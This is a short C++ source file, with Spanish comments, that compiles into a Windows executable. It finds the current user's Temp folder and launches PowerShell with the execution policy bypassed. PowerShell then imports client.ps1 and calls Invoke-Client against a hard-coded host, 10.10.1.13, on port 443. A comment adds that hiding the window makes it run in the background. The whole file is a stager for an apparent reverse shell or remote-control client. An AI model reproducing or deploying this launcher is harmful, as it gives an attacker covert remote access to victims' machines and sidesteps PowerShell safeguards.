#include <iostream>
#include <winsock2.h>
#include <windows.h>
#include <string>
#pragma comment(lib, "urlmon.lib")
#include <lmcons.h>
#include <cstring>
#define LHOST "10.10.1.13"
#define PSSCRIPT "client.ps1"
using namespace std;

//i686-w64-mingw32-g++ ejecuta.cpp -o ejecuta -static-libgcc -static-libstdc++

int main(void){
       string nombre_script = PSSCRIPT;
       string ipaddr = LHOST;
       char username[UNLEN+1];
       DWORD username_len = UNLEN+1;
       GetUserName(username, &username_len);
       string user(username);      
       string ruta_script = "C:\\Users\\" + user + "\\AppData\\Local\\Temp\\" + nombre_script;
       //string strCMD = "start powershell.exe -noprofile -Command \"&Import-Module "+ruta_script+"; Invoke-Client -ServerIP "+ipaddr+" -Port 443\"";
       string strCMD = "start powershell.exe -executionpolicy bypass -Command \"&Import-Module "+ruta_script+"; Invoke-Client -ServerIP "+ipaddr+" -Port 443\"";
       system(strCMD.c_str()); //si -windowstyle hidden, entonces se ejecuta en segundo plano.

}
